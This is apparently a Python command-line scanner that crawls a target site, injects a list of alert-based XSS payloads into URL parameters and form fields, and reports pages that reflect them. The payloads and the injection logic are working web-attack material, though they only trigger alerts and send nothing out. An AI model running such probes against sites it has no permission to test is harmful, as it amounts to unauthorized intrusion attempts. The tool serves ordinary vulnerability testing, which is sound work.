#!/usr/bin/env python3
"""
Simple XSS Scanner - Working Version
Author: AI Assistant
Version: 1.0
"""

import requests
import re
import urllib.parse
import time
import os
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import argparse
from datetime import datetime

class SimpleXSSScanner:
    def __init__(self, target_url, timeout=10):
        self.target_url = target_url
        self.timeout = timeout
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # XSS payloads
        self.payloads = [
            '<script>alert("XSS_CONFIRMED")</script>',
            '<img src=x onerror=alert("XSS_CONFIRMED")>',
            '<svg onload=alert("XSS_CONFIRMED")>',
            '<iframe src="javascript:alert(\'XSS_CONFIRMED\')">',
            '<body onload=alert("XSS_CONFIRMED")>',
            '" onmouseover="alert(\'XSS_CONFIRMED\')" x="',
            "' onmouseover='alert(\"XSS_CONFIRMED\")' x='"
        ]
        
        self.vulnerabilities = []
    
    def log(self, message, level="INFO"):
        """Simple logging"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")
    
    def scan(self):
        """Main scanning method"""
        self.log("🚀 Starting Simple XSS Scanner", "SUCCESS")
        self.log(f"Target: {self.target_url}", "INFO")
        
        try:
            # Phase 1: Reconnaissance
            self.log("Phase 1: Reconnaissance", "INFO")
            recon_data = self._reconnaissance()
            
            if not recon_data:
                self.log("Reconnaissance failed", "ERROR")
                return []
            
            # Phase 2: XSS Testing
            self.log("Phase 2: XSS Testing", "INFO")
            vulnerabilities = self._test_xss_vulnerabilities(recon_data)
            
            # Phase 3: Results
            self.log("Phase 3: Results", "INFO")
            self._show_results(vulnerabilities)
            
            return vulnerabilities
            
        except Exception as e:
            self.log(f"Scan failed: {str(e)}", "ERROR")
            return []
    
    def _reconnaissance(self):
        """Simple reconnaissance"""
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            response.raise_for_status()
            self.log(f"Target accessible (Status: {response.status_code})", "SUCCESS")
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract URLs
            discovered_urls = set()
            discovered_urls.add(self.target_url)
            
            # Find links
            for link in soup.find_all('a', href=True):
                href = link['href']
                if href and not href.startswith('#') and not href.startswith('javascript:'):
                    full_url = urljoin(self.target_url, href)
                    parsed = urlparse(full_url)
                    base_domain = urlparse(self.target_url).netloc
                    
                    if parsed.netloc == base_domain and not self._is_static_resource(full_url):
                        discovered_urls.add(full_url)
            
            # Extract forms
            discovered_forms = []
            for form in soup.find_all('form'):
                form_data = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'GET').upper(),
                    'inputs': []
                }
                
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_data = {
                        'name': input_tag.get('name', ''),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', ''),
                    }
                    form_data['inputs'].append(input_data)
                
                if form_data['action']:
                    form_data['action'] = urljoin(self.target_url, form_data['action'])
                else:
                    form_data['action'] = self.target_url
                
                discovered_forms.append(form_data)
            
            # Extract URL parameters
            url_parameters = set()
            for url in discovered_urls:
                parsed_url = urlparse(url)
                url_params = set(parse_qs(parsed_url.query).keys())
                url_parameters.update(url_params)
            
            self.log(f"Discovered {len(discovered_urls)} URLs", "SUCCESS")
            self.log(f"Found {len(discovered_forms)} forms", "SUCCESS")
            self.log(f"Found {len(url_parameters)} URL parameters", "SUCCESS")
            
            return {
                'urls': list(discovered_urls),
                'forms': discovered_forms,
                'url_parameters': list(url_parameters)
            }
            
        except Exception as e:
            self.log(f"Reconnaissance failed: {str(e)}", "ERROR")
            return None
    
    def _test_xss_vulnerabilities(self, recon_data):
        """Test XSS vulnerabilities"""
        vulnerabilities = []
        
        # Test URL parameters
        for url in recon_data['urls']:
            parsed_url = urlparse(url)
            url_params = parse_qs(parsed_url.query)
            
            for param_name in url_params:
                self.log(f"Testing URL parameter: {param_name} on {url}", "TEST")
                
                for payload in self.payloads:
                    vuln = self._test_url_parameter(url, param_name, payload)
                    if vuln:
                        vulnerabilities.append(vuln)
                        self.log(f"✅ XSS FOUND! Parameter: {param_name}", "VULN")
                        break
        
        # Test form parameters
        for form in recon_data['forms']:
            for input_field in form['inputs']:
                if input_field['name']:
                    self.log(f"Testing form parameter: {input_field['name']} on {form['action']}", "TEST")
                    
                    for payload in self.payloads:
                        vuln = self._test_form_parameter(form, input_field['name'], payload)
                        if vuln:
                            vulnerabilities.append(vuln)
                            self.log(f"✅ XSS FOUND! Parameter: {input_field['name']}", "VULN")
                            break
        
        return vulnerabilities
    
    def _test_url_parameter(self, url, param_name, payload):
        """Test URL parameter for XSS"""
        try:
            # Construct test URL
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            query_params[param_name] = [payload]
            
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
            
            # Send request
            response = self.session.get(test_url, timeout=self.timeout)
            
            # Check for XSS reflection
            if payload in response.text and 'XSS_CONFIRMED' in payload:
                return {
                    'type': 'reflected_xss',
                    'url': test_url,
                    'parameter': param_name,
                    'payload': payload,
                    'response_length': len(response.text),
                    'confidence': 'high'
                }
        
        except Exception as e:
            self.log(f"Error testing URL parameter {param_name}: {str(e)}", "ERROR")
        
        return None
    
    def _test_form_parameter(self, form, param_name, payload):
        """Test form parameter for XSS"""
        try:
            # Prepare form data
            form_data = {}
            for field in form['inputs']:
                if field['name'] == param_name:
                    form_data[field['name']] = payload
                else:
                    form_data[field['name']] = field['value']
            
            # Submit form
            if form['method'] == 'POST':
                response = self.session.post(form['action'], data=form_data, timeout=self.timeout)
            else:
                response = self.session.get(form['action'], params=form_data, timeout=self.timeout)
            
            # Check for XSS reflection
            if payload in response.text and 'XSS_CONFIRMED' in payload:
                return {
                    'type': 'reflected_xss',
                    'url': form['action'],
                    'parameter': param_name,
                    'payload': payload,
                    'method': form['method'],
                    'response_length': len(response.text),
                    'confidence': 'high'
                }
        
        except Exception as e:
            self.log(f"Error testing form parameter {param_name}: {str(e)}", "ERROR")
        
        return None
    
    def _is_static_resource(self, url):
        """Check if URL is static resource"""
        static_extensions = ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.svg', '.pdf']
        return any(url.lower().endswith(ext) for ext in static_extensions)
    
    def _show_results(self, vulnerabilities):
        """Show scan results"""
        self.log("=" * 60, "SUCCESS")
        self.log("SCAN RESULTS", "SUCCESS")
        self.log("=" * 60, "SUCCESS")
        
        total_vulns = len(vulnerabilities)
        self.log(f"Total vulnerabilities: {total_vulns}", "SUCCESS")
        
        if vulnerabilities:
            self.log("\nVulnerabilities found:", "VULN")
            for i, vuln in enumerate(vulnerabilities, 1):
                self.log(f"  {i}. {vuln['type']} - {vuln['parameter']} - {vuln['confidence']}", "VULN")
                self.log(f"     URL: {vuln['url']}", "VULN")
                self.log(f"     Payload: {vuln['payload']}", "VULN")
        else:
            self.log("No vulnerabilities found", "INFO")

def main():
    parser = argparse.ArgumentParser(description='Simple XSS Scanner')
    parser.add_argument('url', help='Target URL to scan')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout (default: 10)')
    
    args = parser.parse_args()
    
    scanner = SimpleXSSScanner(args.url, args.timeout)
    scanner.scan()

if __name__ == "__main__":
    main()